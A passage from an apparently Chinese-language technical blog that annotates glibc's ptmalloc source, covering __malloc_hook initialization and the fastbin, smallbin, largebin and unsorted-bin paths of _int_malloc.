class="hljs-comment">//如果分配区不为空那就释放互斥锁(mutex)</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<span class="hljs-comment">//返回分配的内存块的指针</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>钩子函数指针：<ul><li>钩子： 钩子是一种拦截机制，允许程序在系统或应用程序的某些关键点插入自己的代码 </li><li>钩子函数指针： 钩子函数指针是一个指向函数的指针，它指向的函数是用户定义的回调函数。当某个事件被触发时，系统会调用这个指针指向的函数，从而执行<strong>用户定义的逻辑</strong>。</li></ul></li><li>原子操作：<ul><li>原子操作是指一个不可分割的操作，它在执行过程中不会被中断或干扰，要么完全执行，要么完全不执行，中间状态不会被其他操作看到。 主要用于多线程或并发编程环境，避免出现竞态条件和数据不一致环境</li></ul></li></ul><p>对于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//_malloc_hook是一个全局钩子函数指针，允许用于在malloc时插入自己的逻辑</span><br><span class="hljs-comment">//atomic_forced_read：确保_malloc_hook的读取是原子操作，防止多线程导致的错误</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<span class="hljs-comment">//RETURN_ADDRESS(0)获取当前函数的返回地址，用于调试和追踪</span><br></code></pre></td></tr></table></figure><p>hook被初始化为<code>_malloc_hook</code></p><p><code>_malloc_hook</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">weak_variable</span> <span class="hljs-params">(*__malloc_hook)</span><br>  <span class="hljs-params">(<span class="hljs-type">size_t</span> __size, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)</span> = malloc_hook_ini;<br></code></pre></td></tr></table></figure><p>这是对<code>_malloc_hook</code>的初始化，将其指向一个名为<code>malloc_hook_ini</code></p><p><code>malloc_hook_ini</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">malloc_hook_ini</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* caller)</span> &#123;<br>    __malloc_hook = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 禁用当前钩子，防止递归调用，这里保证在多次调用_libc_malloc情况下只会在第一次时调用hook</span><br>    ptmalloc_init();       <span class="hljs-comment">// 初始化内存分配器</span><br>    <span class="hljs-keyword">return</span> __libc_malloc(sz);  <span class="hljs-comment">// 调用原始的 malloc 函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里又调用了<code>ptmalloc_init()</code>，是一个初始化函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ptmalloc_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (__malloc_initialized &gt;= <span class="hljs-number">0</span>)<span class="hljs-comment">//检查是否已经初始化了__malloc_initialized是一个全局变量，用于记录内存分配器是否已经初始化。&gt;=0表示分配器已经初始化就直接返回，&lt;0是未初始化，要继续</span><br>    <span class="hljs-keyword">return</span>;<br>  __malloc_initialized = <span class="hljs-number">0</span>;<span class="hljs-comment">//表示分配器正在初始化，防止其他线程重复初始化</span><br>  <br>  thread_arena = &amp;main_arena;<span class="hljs-comment">//将线程本地分配区指向主分配区</span><br>  <br>  __malloc_initialized = <span class="hljs-number">1</span>;<span class="hljs-comment">//标记初始化完成</span><br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><p>第一次调用时要初始化那些东西，而后再次调用时，就跳过了直接到<code>_int_malloc</code></p><p>可以由代码看到<code>arena_get (ar_ptr, bytes);</code>后就到了<code>_int_malloc</code>，这是ptmalloc分配器的核心函数，负责实际的内存分配逻辑，那么接下去就到了<code>_int_malloc</code>源码部分</p><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size (规范化请求大小)*/</span><br>     <span class="hljs-comment">//nb是经过调整后的请求大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index （关联的bin索引）*/</span><br>     <span class="hljs-comment">//idx是请求大小对应的bin索引</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin（关联的bin） */</span><br>     <span class="hljs-comment">//bin是一个指向bin的指针，表示当前请求大小对应的bin</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk（检查/选择的块） */</span><br>     <span class="hljs-comment">//victim：指针，指向当前正在检查或选择的内存块</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>     <span class="hljs-comment">//size是当前内存块的大小</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index（它的bin索引） */</span><br>    <span class="hljs-comment">//=当前内存块所属的bin索引</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split （分割后的剩余部分）*/</span><br>     <span class="hljs-comment">//指针，指向分割后的剩余部分</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>     <span class="hljs-comment">//剩余部分大小</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser （位图遍历器）*/</span><br>     <span class="hljs-comment">//block用来遍历位图</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser （位图遍历器）*/</span><br>     <span class="hljs-comment">//bit是另一个变量，用来遍历位图中的位</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap（当前binmap中的word） */</span><br>     <span class="hljs-comment">//map是当前正在处理的binmap中的一个字(word)</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking（链接时的临时变量） */</span><br>     <span class="hljs-comment">//一个临时指针，用于链接</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking （链接时的临时变量）*/</span><br>     <span class="hljs-comment">//另一个临时指针，用于链接</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">   overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">   to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">   size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">   that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">   aligned.</span><br><span class="hljs-comment"> */</span><br><br>checked_request2size (bytes, nb);<span class="hljs-comment">//将请求的大小转换为内部实际请求的大小</span><br></code></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br><span class="hljs-comment">/* 没有可用的分配区域（arena）。回退到 sysmalloc，通过 mmap 获取一块内存。 */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<span class="hljs-comment">//检查是否有可用arena</span><br>    &#123;<br>       <span class="hljs-comment">//没有时</span><br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接着来到fast bins</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<span class="hljs-comment">//判断是否符合fast bins的条件</span><br>  &#123;<br>    idx = fastbin_index (nb);<span class="hljs-comment">//根据请求大小计算对应的fast bins的索引</span><br>    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="hljs-comment">//获取fastbin指针</span><br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span><span class="hljs-comment">//尝试从fastbins中取出一个内存块</span><br>      &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>           != victim);<span class="hljs-comment">//原子操作。如果当前值等于预期值（victim），则将变量更新为新值（victim-&gt;fd），并返回原值（victim）。如果当前值不等于预期值，则返回当前值</span><br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<span class="hljs-comment">//检查内存块是否有效</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查该fastbin的size是否合法</span><br>          &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>          errout:<br>            malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>          &#125;<br>        check_remalloced_chunk (av, victim, nb);<span class="hljs-comment">//检查内存块是否被重新分配。转到定义看</span><br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//将内存块转换为用户可用的内存地址</span><br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>check_remalloced_chunk</code>定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> !MALLOC_DEBUG</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_free_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_inuse_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_remalloced_chunk(A, P, N)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloced_chunk(A, P, N)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloc_state(A)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)<span class="hljs-comment">//检查内存块P的状态是否符合预期</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)<span class="hljs-comment">//检查已释放的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)<span class="hljs-comment">//检查正在使用的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)<span class="hljs-comment">//检查重新分配的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)<span class="hljs-comment">//检查新分配的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)<span class="hljs-comment">//检查分配区A状态是否一致</span></span><br></code></pre></td></tr></table></figure><ul><li>MALLOC_DEBUG是一个宏，用于控制是否开启了调试<ul><li>未定义：则所有调试检查宏被定义为空，不执行任何操作</li><li>定义：这些宏会被定义为调用实际的检查函数</li></ul></li></ul><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">    hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">    processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">    anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">  */</span><br><br> <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//检查是否属于smallbin范围内</span><br>   &#123;<br>     idx = smallbin_index (nb);<span class="hljs-comment">//计算smallbin索引</span><br>     bin = bin_at (av, idx);<span class="hljs-comment">//获取smallbin指针</span><br><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<span class="hljs-comment">//尝试从smallbin中分配内存</span><br>       &#123;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check（初始化检查） */</span><br>           malloc_consolidate (av);<span class="hljs-comment">//如果分配区还没初始化就初始化，这是初始化函数</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="hljs-comment">//检查双向链表完整性</span><br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<span class="hljs-comment">//标记内存块已使用和设置内存块大小</span><br>              <span class="hljs-comment">//接下来两行是更新双向链表指针</span><br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<span class="hljs-comment">//如果不属于主分配区，则进入if，标记为非主分配区</span><br>               victim-&gt;size |= NON_MAIN_ARENA;<br>             check_malloced_chunk (av, victim, nb);<span class="hljs-comment">//检查内存块</span><br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//转换</span><br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">   While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">   even seeing if there is space available, this avoids</span><br><span class="hljs-comment">   fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">   Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">   large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">   invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">   it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">else</span><br>  &#123;<br>    idx = largebin_index (nb);<span class="hljs-comment">//计算largebin索引</span><br>    <span class="hljs-keyword">if</span> (have_fastchunks (av))<span class="hljs-comment">//检查分配区有没有fastbins中的内存块，如果有就合并</span><br>      malloc_consolidate (av);<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>   &#123;<br>     <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<span class="hljs-comment">//初始化计数器防止无限循环</span><br></code></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//从unsorted bin取出chunkunsorted_chunks(av)：获取未排序 chunk 列表的头指针。victim：当前尝试分配的 chunk</span><br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查chunk有效，小于2*SIZE_SZ和大于分配区总内存大小的就是无效的</span><br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<span class="hljs-comment">//计算chunk实际大小</span><br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br>      <span class="hljs-comment">/* 如果是一个小请求，尝试使用上一次的剩余部分（remainder），前提是无序链表（unsorted bin）中只有一个块。这有助于提升连续小请求的局部性。这是最佳拟合（best-fit）策略的唯一例外，仅适用于没有精确匹配的小块。 */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<span class="hljs-comment">//如果请求的是小块内存且unsortedbin只有一个chunk(last_remainder)且该chunk大小大于请求大小+MINSIZE</span><br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>               <span class="hljs-comment">//分割chunk</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>               <span class="hljs-comment">//更新unsorted bin</span><br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>               <span class="hljs-comment">//设置chunk的大小和状态</span><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>               <span class="hljs-comment">//返回分配的内存地址</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>      <span class="hljs-comment">//若chunk不满足条件，则移出unsorted bin</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>      <span class="hljs-comment">//处理精准匹配</span><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><span class="hljs-comment">//将chunk插入到对应的bin中</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<span class="hljs-comment">//chunk在smallbin范围</span><br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//largebin范围，插入到largebins中</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span 